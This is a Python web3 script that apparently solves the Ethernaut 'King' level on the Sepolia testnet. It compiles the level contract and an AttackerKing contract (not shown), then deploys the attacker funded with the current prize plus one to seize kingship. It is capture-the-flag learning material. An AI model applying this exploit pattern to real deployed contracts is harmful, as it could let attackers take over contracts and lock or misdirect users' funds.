import os

import solcx
from dotenv import load_dotenv
from web3 import Web3

load_dotenv()

w3 = Web3(Web3.HTTPProvider(os.getenv('PROVIDER_URL')))
if w3.is_connected():
    print("Successfully connected to Sepolia via provider!")
else:
    print("Failed to connect to Sepolia via provider.")
    exit()

# Load environment variables
_PRIVATE_KEY = os.getenv('PRIVATE_KEY')
_WALLET = w3.to_checksum_address(os.getenv('WALLET'))
tx_receipt_keys = ["cumulativeGasUsed", "effectiveGasPrice", "from", "gasUsed", "logs", "status",
                   "to", "transactionHash", "transactionIndex", "blockNumber", "contractAddress"]


def minimal_tx(tx_receipt):
    return {k: tx_receipt[k] for k in tx_receipt_keys if k in tx_receipt}


def compile_contract(contract_path: str, version: str, contract_name: str = None):
    solcx.set_solc_version(version=version)
    with open(contract_path, 'r') as file:
        contract_source = file.read()

    compiled_sol = solcx.compile_source(contract_source)
    if contract_name is None:
        contract_key = next(iter(compiled_sol))
    else:
        contract_key = f'<stdin>:{contract_name}'
    contract_interface = compiled_sol[contract_key]
    print(f'Compiled {contract_path} for contract {contract_key}')
    return contract_interface


# Load Ethernaut deployed contract
_ethernaut_deployed_contract_address = w3.to_checksum_address("")
king_contract = compile_contract('./L009_King/King.sol', '0.8.0', 'King')
king_contract = w3.eth.contract(address=_ethernaut_deployed_contract_address, abi=king_contract['abi'])
current_prize = king_contract.functions.prize().call()

# Prepare to deploy attacking contract
compiled_hack_contract = compile_contract('./L009_King/AttackerKing.sol', '0.8.0', 'AttackerKing')
hack_contract = w3.eth.contract(abi=compiled_hack_contract['abi'], bytecode=compiled_hack_contract['bin'])
claim_amount = current_prize + 1

# Construct and sign the transaction
transaction = hack_contract.constructor(king_contract.address).build_transaction({
    'from': _WALLET,
    'chainId': 11155111,  # sepolia testnet chain id
    'value': claim_amount,
    # 'gas': 2000000,
    # 'gasPrice': w3.to_wei('20', 'gwei')
    'nonce': w3.eth.get_transaction_count(w3.to_checksum_address(_WALLET))
})
print(f'transaction= {transaction}')
signed_txn = w3.eth.account.sign_transaction(transaction, private_key=_PRIVATE_KEY)

# Deploy attacking contract
txn_hash = w3.eth.send_raw_transaction(signed_txn.raw_transaction)
tx_receipt = w3.eth.wait_for_transaction_receipt(txn_hash)
assert tx_receipt['status'] == 1
print(f'AttackerKing is deployed {minimal_tx(tx_receipt)}')

# contract interaction are NOT needed here for this level
# hack_contract = w3.eth.contract(address=tx_receipt['contractAddress'], abi=compiled_hack_contract['abi'])
